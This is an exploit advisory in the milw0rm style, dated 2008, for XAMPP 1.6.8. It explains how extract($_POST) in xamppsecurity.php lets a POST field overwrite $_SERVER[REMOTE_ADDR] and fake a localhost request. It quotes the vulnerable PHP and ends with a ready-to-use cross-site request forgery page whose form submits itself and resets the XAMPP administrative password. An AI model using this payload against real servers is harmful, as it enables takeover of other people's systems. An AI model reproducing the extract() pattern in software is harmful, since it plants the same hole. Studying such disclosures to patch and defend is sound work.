@@ -1,0 +1,57 @@
+XAMPP change administrative password:
+--------------------------------------------------------------------------------
+Written by Michael Brooks
+special thanks to str0ke
+
+Affects XAMPP 1.6.8.
+homepage: http://www.apachefriends.org/
+XAMPP has 17+ million downloads from sourceforge.net.
+register_globals=On or Off
+This attack is exploitable even when this page is reporting a fully
+secure system: http://10.1.1.10/security/index.php
+
+There are two vulnerabilities that are being used toagther.
+1)Global variable manipulation to spoof ip address.
+2)XSRF to change the .htaccess password for http://10.1.1.10/security/
+ and http://10.1.1.10/xampp/ .
+
+The $_SERVER[REMOTE_ADDR] comes directly from Apache's tcp socket and
+this cannot normally be spoofed.
+However extract($_POST); can be used to overwrite any declared
+variable,  including the $_SERVER superglobal.  This can be used to
+"spoof"  your ip address as 127.0.0.1
+This xsrf attack can be exploited from a browser in any ip address, so
+long as that browser is currently authenticated.
+
+This vulnerable code is from the very top of: /security/xamppsecurity.php
+<?php
+       error_reporting(0);
+       extract($_POST);
+       extract($_SERVER);
+       $host = "127.0.0.1";
+       $timeout = "1";
+
+       if ($REMOTE_ADDR) {
+               if ($REMOTE_ADDR != $host) {
+                       echo "<h2> FORBIDDEN FOR CLIENT $REMOTE_ADDR <h2>";
+                       exit;
+               }
+       }
+//...
+
+//Start of xsrf attack
+<html>
+	<form action='http://10.1.1.10/security/xamppsecurity.php' method='POST' id=1>
+	          <input type="hidden" name="_SERVER[REMOTE_ADDR]" value="127.0.0.1">
+		<input type=hidden name="xamppuser" value=admin >
+		<input type=hidden name="xampppasswd" value=password>
+		<input type=hidden name="xamppaccess" value="Make+safe+the+XAMPP+directory">
+		<input type=submit>
+	</form>
+</html>
+<script>
+	document.getElementById(1).submit();
+</script>
+//End of xsrf attack
+
+# milw0rm.com [2008-12-08]
